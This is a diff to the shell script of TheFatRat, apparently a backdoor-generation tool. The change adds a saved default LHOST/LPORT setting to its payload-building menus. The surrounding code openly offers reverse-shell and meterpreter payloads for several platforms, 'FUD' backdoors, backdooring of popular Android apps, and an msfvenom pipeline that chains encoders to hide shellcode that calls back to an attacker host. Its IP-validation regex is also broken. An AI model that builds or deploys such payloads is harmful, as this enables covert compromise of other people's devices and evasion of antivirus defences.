@@ -80,6 +80,7 @@ hostn=`host $publicip | awk '{print $5}' | sed 's/.$//'`
 list=$path/config/listeners
 log=$path/logs/apk-old.log
 pwind=$path/logs/pwind.log
+defcon=$path/config/conf.def
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -110,8 +111,104 @@ spinlong2 ()
     done
 }
 
+function confdefault () {
+clear
+confd=$path/config/conf.def
+if [ -f "$confd" ]
+then
+clear
+echo -e $okegreen " "
+echo "Fatrat detected that exists a default config file
+with the following values :"
+echo ""
+lh=`sed -n 1p $confd`
+lp=`sed -n 2p $confd`
+echo "LHOST : $lh "
+echo "LPORT : $lp "
+echo ""
+read -rsp $'Press any key go to options menu \n' -n 1 key
+qt=$(zenity  --list  --radiolist  --column "Select" --column "Action" TRUE "Change current config" FALSE "Delete configuration file" FALSE "Cancel" --text="Select one othe following options");
+case $qt in 
 
+"Change current config")
+rm -rf $confd
+touch $confd
+clear
+val=$(zenity --forms --title="Config Defaults" --text="Change config" \
+   --add-entry="LHOST : " \
+   --add-entry="LPORT : ")
+echo $val > temp/temp.tmp
+tr "|" "\n" <temp/temp.tmp >$confd
+rm temp/temp.tmp
+echo -e $okegreen ""
+read -rsp $'Configuration changed , Press any key to continue \n' -n 1 key
+clear
+menu
 
+;;
+"Delete configuration file")
+clear
+echo -e $okegreen ""
+rm -rf $confd
+echo "Default configuration file was deleted , you will now have 
+to input Lhost & Lport values manually in fatrat options ."
+echo ""
+read -rsp $'Press any key to return to fatrat menu\n' -n 1 key
+clear
+menu
+
+;;
+
+"Cancel")
+clear
+menu
+
+;;
+esac
+
+else
+echo -e $okegreen ""
+echo "No default configuration file detected "
+read -rsp $'Press any key to go to options \n' -n 1 key
+nc=$(zenity  --list  --radiolist  --column "Select" --column "Action" TRUE "Create config" FALSE "Cancel" --text="Select one othe following options");
+case $nc in 
+
+"Create config")
+confd=$path/config/conf.def
+touch $confd
+val=$(zenity --forms --title="Config Defaults" --text="Create config" \
+   --add-entry="LHOST : " \
+   --add-entry="LPORT : ")
+
+echo $val > temp/temp.tmp
+tr "|" "\n" <temp/temp.tmp >$confd
+rm temp/temp.tmp
+clear
+echo -e $okegreen ""
+read -rsp $'Configuration created , Press any key to continue \n' -n 1 key
+clear
+menu
+
+;;
+
+"Cancel")
+clear
+menu
+
+;;
+esac
+fi
+}
+valid_ip()
+{
+
+if [[ $yourip =~ ^[0-255]+\.[0-255]+\.[0-255]+\.[0-255]+$ ]]; then
+  echo ""
+  err=1
+else
+  err=0
+fi
+}
 
 #for checking if your command is correct
 gboor ()
@@ -190,6 +287,12 @@ else
 exit 1
 fi
 
+
+if [ -f "$defcon" ]
+then
+yourip=`sed -n 1p $defcon`
+yourport=`sed -n 2p $defcon`
+fi
 
 #Jangan Nakal CTRL C MULU
 
@@ -629,7 +732,19 @@ echo ""
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
+                                if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 				spinlong
 				echo ""
@@ -648,8 +763,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi 
+                                read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/powershell_bind_tcp" FALSE "windows/powershell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
          			echo ""
 				echo ""
@@ -667,8 +794,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/shell/reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 				echo ""
 				echo ""
@@ -686,8 +825,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -705,8 +856,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -724,8 +887,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -743,8 +918,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -762,8 +949,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -781,8 +980,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -800,8 +1011,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -819,8 +1042,20 @@ echo ""
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
-        			read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
+        			if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+                                read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
 				echo ""
@@ -839,12 +1074,19 @@ echo ""
 					  echo -e $yellow "  Your local IP address is : $lanip"
 					  echo -e $yellow "  Your public IP address is : $publicip"
 					  echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 					  echo -e $okegreen""
-					  echo -ne "  SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen " SET LPORT : ";tput sgr0
-					read yourport
+                                        if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
 					read fira
@@ -873,13 +1115,19 @@ echo ""
 					    echo -e $yellow "  Your local IP address is : $lanip"
 					    echo -e $yellow "  Your public IP address is : $publicip"
 					    echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 					    echo -e $okegreen""
-					    echo -ne "  SET LHOST : ";tput sgr0
-  					read yourip
-  					echo ""
-  					echo -ne $okegreen " SET LPORT : ";tput sgr0
-  					read yourport
-  					echo ""
+					    if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
   					echo -ne $okegreen " Please enter the base name for output files ex: test.zip / test.rar):" ;tput sgr0
   					read fira
             				echo ""
@@ -960,6 +1208,11 @@ echo -e $okegreen"  ============================================================
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
 				read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_linux.rc"
@@ -991,6 +1244,11 @@ echo -e $okegreen"  ============================================================
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_windows.rc"
@@ -1021,6 +1279,11 @@ echo -e $okegreen"  ============================================================
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_mac.rc"
@@ -1051,6 +1314,11 @@ echo -e $okegreen"  ============================================================
 				echo -e $yellow "  Your local IP address is : $lanip"
 				echo -e $yellow "  Your public IP address is : $publicip"
 				echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 				echo -e $okegreen""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_android.rc"
@@ -1149,13 +1417,19 @@ case $choice in
           echo -e $yellow "  Your local IP address is : $lanip"
           echo -e $yellow "  Your public IP address is : $publicip"
           echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
           echo -e $okegreen""
-          echo -ne "   SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen "  SET LPORT : ";tput sgr0
-					read yourport
-					echo ""
+          if [ -z "$yourip" ]; then
+	  read -p '  Set LHOST IP: ' yourip
+          fi
+          echo -e $okegreen ""
+          if [ -z "$yourport" ]; then
+          read -p '  Set LPORT: ' yourport
+          fi
 					echo -ne $okegreen "  Please enter the base name for output files :" ;tput sgr0
 					read fira
 					echo ""
@@ -1209,13 +1483,20 @@ fi
           echo -e $yellow "  Your local IP address is : $lanip"
           echo -e $yellow "  Your public IP address is : $publicip"
           echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
           echo -e $okegreen""
-					echo -ne "   SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen "  SET LPORT : ";tput sgr0
-					read yourport
-					echo ""
+					if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
+echo ""
 					echo -ne $okegreen "  Enter the base name for output files : " ;tput sgr0
 					read fira
 					echo ""
@@ -1337,12 +1618,19 @@ fi
           echo -e $yellow "  Your local IP address is : $lanip"
           echo -e $yellow "  Your public IP address is : $publicip"
           echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
           echo -e $okegreen""
-          echo -ne "   SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen "  SET LPORT : ";tput sgr0
-					read yourport
+          if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen "  Enter the base name for output files : " ;tput sgr0
 					read fira
@@ -1469,12 +1757,19 @@ fi
           echo -e $yellow "  Your local IP address is : $lanip"
           echo -e $yellow "  Your public IP address is : $publicip"
           echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
           echo -e $okegreen""
-	        echo -ne "   SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen "  SET LPORT : ";tput sgr0
-					read yourport
+	        if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen "  Enter the base name for output files : " ;tput sgr0
 					read fira
@@ -1539,12 +1834,19 @@ fi
                    echo -e $yellow "  Your local IP address is : $lanip"
                    echo -e $yellow "  Your public IP address is : $publicip"
                    echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
                    echo -e $okegreen""
-					echo -ne "   SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen "  SET LPORT : ";tput sgr0
-					read yourport
+				if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen "  Enter the base name for output files : " ;tput sgr0
 					read fira
@@ -1639,12 +1941,19 @@ echo -e $okegreen""
 echo -e $yellow "  Your local IP address is : $lanip"
 echo -e $yellow "  Your public IP address is : $publicip"
 echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 echo -e $okegreen""
-echo -ne " SET LHOST : ";tput sgr0
-read yourip
-echo ""
-echo -ne $okegreen "SET LPORT : ";tput sgr0
-read yourport
+if [ -z "$yourip" ]; then
+read -p '  Set LHOST IP: ' yourip
+fi
+echo -e $okegreen ""
+if [ -z "$yourport" ]; then
+read -p '  Set LPORT: ' yourport
+fi
 echo ""
 copyfile=$(zenity --file-selection --file-filter='APK files (apk) | *.apk' --title="Select your app/game apk file");
 cp $copyfile $path/temp/app.apk >/dev/null 2>&1
@@ -1889,12 +2198,19 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					  echo -e $yellow "  Your local IP address is : $lanip"
 					  echo -e $yellow "  Your public IP address is : $publicip"
 					  echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 					  echo -e $okegreen ""
-					echo -ne "  SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen " SET LPORT : ";tput sgr0
-					read yourport
+					if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
 					read fira
@@ -1924,11 +2240,18 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					  echo -e $yellow "  Your public IP address is : $publicip"
 					  echo -e $yellow "  Your Hostname is : $hostn"
 					  echo -e $okegreen ""
-					echo -ne "  SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen " SET LPORT : ";tput sgr0
-					read yourport
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
+					if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
 					read fira
@@ -1971,12 +2294,19 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					  echo -e $yellow "  Your local IP address is : $lanip"
 					  echo -e $yellow "  Your public IP address is : $publicip"
 					  echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 					  echo -e $okegreen ""
-					echo -ne "  SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen " SET LPORT : ";tput sgr0
-					read yourport
+					if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
 					read fira
@@ -2014,12 +2344,19 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					  echo -e $yellow "  Your local IP address is : $lanip"
 					  echo -e $yellow "  Your public IP address is : $publicip"
 					  echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 					  echo -e $okegreen ""
-					echo -ne "  SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen " SET LPORT : ";tput sgr0
-					read yourport
+					if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
 					read fira
@@ -2060,12 +2397,19 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					  echo -e $yellow "  Your local IP address is : $lanip"
 					  echo -e $yellow "  Your public IP address is : $publicip"
 					  echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 					  echo -e $okegreen ""
-					echo -ne "  SET LHOST : ";tput sgr0
-					read yourip
-					echo ""
-					echo -ne $okegreen " SET LPORT : ";tput sgr0
-					read yourport
+					if [ -z "$yourip" ]; then
+				read -p '  Set LHOST IP: ' yourip
+                                fi
+                                echo -e $okegreen ""
+                                if [ -z "$yourport" ]; then
+                                read -p '  Set LPORT: ' yourport
+                                fi
 					echo ""
 					echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
 					read fira
@@ -2111,12 +2455,19 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
         echo -e $yellow "  Your local IP address is : $lanip"
         echo -e $yellow "  Your public IP address is : $publicip"
         echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
         echo -e $okegreen ""
-        echo -ne "  SET LHOST : ";tput sgr0
-        read yourip
-        echo ""
-        echo -ne $okegreen " SET LPORT : ";tput sgr0
-        read yourport
+        if [ -z "$yourip" ]; then
+	read -p '  Set LHOST IP: ' yourip
+        fi
+        echo -e $okegreen ""
+        if [ -z "$yourport" ]; then
+        read -p '  Set LPORT: ' yourport
+        fi
         echo ""
         echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
         read fira
@@ -2318,12 +2669,19 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
       echo -e $yellow "  Your local IP address is : $lanip"
       echo -e $yellow "  Your public IP address is : $publicip"
       echo -e $yellow "  Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
       echo -e $okegreen""
-      echo -ne "  SET LHOST : ";tput sgr0
-      read yourip
-      echo ""
-      echo -ne $okegreen " SET LPORT : ";tput sgr0
-      read yourport
+      if [ -z "$yourip" ]; then
+      read -p '  Set LHOST IP: ' yourip
+      fi
+      echo -e $okegreen ""
+      if [ -z "$yourport" ]; then
+      read -p '  Set LPORT: ' yourport
+      fi
       echo ""
       echo -ne $okegreen " Please enter the base name for output files :" ;tput sgr0
       read fira
@@ -2563,13 +2921,19 @@ echo -e $okegreen""
 echo -e $yellow "Your local IP address is : $lanip"
 echo -e $yellow "Your public IP address is : $publicip"
 echo -e $yellow "Your Hostname is : $hostn"
+if [ ! -f "$defcon" ]
+then
+yourip=""
+yourport=""
+fi
 echo -e $okegreen""
-echo -ne  $cyan"TYPE YOUR LHOST : $okegreen" ;
-read IP
-echo ""
-echo ""
-echo -ne $cyan"TYPE YOUR LPORT : $okegreen" ;
-    read PORT
+if [ -z "$yourip" ]; then
+read -p '  Set LHOST IP: ' yourip
+fi
+echo -e $okegreen ""
+if [ -z "$yourport" ]; then
+read -p '  Set LPORT: ' yourport
+fi
     echo ""
     echo ""
 echo ""
@@ -2578,7 +2942,7 @@ echo ""
 echo ""
 spinlong
 #Payload creater
-$MSFVENOM -p "$PAYLOAD" LHOST="$IP" LPORT="$PORT" EXITFUNC=thread -f raw | $MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2>/dev/null | $MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 --platform linux -f raw 2>/dev/null | $MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 --platform win -f raw 2>/dev/null |  $MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 --platform win -f c > msf.c 2>/dev/null
+$MSFVENOM -p "$PAYLOAD" LHOST="$yourip" LPORT="$yourport" EXITFUNC=thread -f raw | $MSFVENOM -e x86/shikata_ga_nai -i $ITER -f raw 2>/dev/null | $MSFVENOM -e x86/jmp_call_additive -i $ITER -a x86 --platform linux -f raw 2>/dev/null | $MSFVENOM -e x86/call4_dword_xor -i $ITER -a x86 --platform win -f raw 2>/dev/null |  $MSFVENOM -e x86/shikata_ga_nai -i $ITER -a x86 --platform win -f c > msf.c 2>/dev/null
 echo ""
 echo ""
 
@@ -2807,15 +3171,16 @@ menu () {
   		echo -e $white"	[$okegreen"04"$white]$okegreen  Create Fud Backdoor with backdoor-factory [embed] "
   		echo -e $white"	[$okegreen"05"$white]$okegreen  Backdooring Original apk [Instagram, Line,etc] "
   		echo -e $white"	[$okegreen"06"$white]$okegreen  Create Fud Backdoor 1000% with PwnWinds [Excelent] "
-      echo -e $white"	[$okegreen"07"$white]$okegreen  Create Backdoor For Office with Microsploit "
+                echo -e $white"	[$okegreen"07"$white]$okegreen  Create Backdoor For Office with Microsploit "
   		echo -e $white"	[$okegreen"08"$white]$okegreen  Create auto listeners  "
   		echo -e $white"	[$okegreen"09"$white]$okegreen  Jump to msfconsole  "
   		echo -e $white"	[$okegreen"10"$white]$okegreen  Searchsploit  "
-      echo -e $white"	[$okegreen"11"$white]$okegreen  File Pumper [Increase Your Files Size] "
-  		echo -e $white"	[$okegreen"12"$white]$okegreen  Cleanup  "
-  		echo -e $white"	[$okegreen"13"$white]$okegreen  Help  "
-  		echo -e $white"	[$okegreen"14"$white]$okegreen  Credits  "
-  		echo -e $white"	[$okegreen"15"$white]$okegreen  Exit  "
+                echo -e $white"	[$okegreen"11"$white]$okegreen  File Pumper [Increase Your Files Size] "
+                echo -e $white"	[$okegreen"12"$white]$okegreen  Configure Default Lhost & Lport "
+  		echo -e $white"	[$okegreen"13"$white]$okegreen  Cleanup  "
+  		echo -e $white"	[$okegreen"14"$white]$okegreen  Help  "
+  		echo -e $white"	[$okegreen"15"$white]$okegreen  Credits  "
+  		echo -e $white"	[$okegreen"16"$white]$okegreen  Exit  "
   		echo -e " "
     	 	echo -e $okegreen" ┌─["$red"TheFatRat$okegreen]──[$red~$okegreen]─["$yellow"menu$okegreen]:"	
 		echo -ne $okegreen" └─────► " ;tput sgr0
@@ -2910,7 +3275,14 @@ menu () {
         read oke
         menu
 
-  		elif test $fatrat == '12'
+  	elif test $fatrat == '12'
+      then 
+      echo ""
+      confdefault
+      clear
+      menu	
+
+          elif test $fatrat == '13'
   			then
   			echo ""
   			echo -ne $red"  [>] $cyan Are you sure you want to clean payload folders? [y/N] : "
@@ -2954,15 +3326,15 @@ menu () {
   			read anjeng
   			menu
 
-  		elif test $fatrat == '13'
+  		elif test $fatrat == '14'
    			then
    			firefox https://github.com/Screetsec/TheFatRat/blob/master/README.md
 
